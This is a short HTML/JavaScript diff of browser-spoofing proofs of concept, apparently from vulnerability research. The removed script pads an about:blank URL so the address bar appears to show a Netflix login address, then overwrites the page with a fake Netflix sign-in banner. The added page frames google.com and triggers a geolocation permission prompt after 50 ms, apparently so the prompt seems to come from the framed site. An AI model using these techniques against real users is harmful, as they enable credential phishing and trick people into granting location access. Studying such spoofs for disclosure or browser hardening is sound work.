@@ -1,24 +1,12 @@
-<script>
-// Method 6: Simulated anchor click
-function anchorClickSpoof() {
-    const target = 'https://netflix.com/login';
-    const spoofURL = 'about:blank#' + 'b'.repeat(160) + '#' + target;
-    
-    // Create anchor dan trigger click
-    const anchor = document.createElement('a');
-    anchor.href = spoofURL;
-    anchor.click();
-    
-    // Modify content
+<html>
+<head><title>Double Prompt via Iframe</title></head>
+<body>
+  <h2>Double Prompt Race Condition</h2>
+  <iframe src="https://google.com"></iframe>
+  <script>
     setTimeout(() => {
-        document.body.innerHTML = `
-            <div style="background: #141414; color: white; padding: 40px;">
-                <h1 style="color: #e50914">NETFLIX</h1>
-                <p>Sign in to your account</p>
-            </div>
-        `;
-    }, 150);
-}
-
-anchorClickSpoof();
-</script>
+      navigator.geolocation.getCurrentPosition(() => {}, () => {});
+    }, 50);
+  </script>
+</body>
+</html>
